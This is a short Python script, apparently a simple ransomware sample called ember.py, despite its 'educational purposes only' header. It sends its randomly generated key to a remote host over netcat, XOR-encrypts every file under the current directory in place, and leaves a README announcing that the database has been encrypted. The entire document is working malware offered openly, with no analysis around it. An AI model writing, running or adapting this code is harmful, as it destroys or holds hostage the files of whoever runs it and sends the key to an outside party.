#!/usr/bin/env python
# Author: Blue
# Note: This script is for educational purposes only

import glob
import string
import random
import os
def keygen(size=8, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for i in range(size))

readme = "Your database has been encrypted."
burned = []
key = keygen()
os.system("echo " + str(key) + " | nc X.X.X.X 7777")
targets = [y for x in os.walk("./") for y in glob.glob(os.path.join(x[0], '*'))]
for f in targets:
    if (f == "./ember.py"):
        continue
    try:
        token = open(f, 'rb').read()

    	with open(f,'wb') as chain:
        	k = key*(len(token)/len(key)+1)
        	remnant = map(lambda _: chr(ord(_[0])^ord(_[1])), zip(k, token))
        	remnant = "".join(remnant)
        	chain.write(bytes(remnant))
        burned.append(f)
    except:
	continue

with open('README', 'w') as ash:
    ash.write(readme)
    ash.write(" Here is the list of encrypted files:\n")
    for f in burned:
        ash.write("\t" + f + "\n")

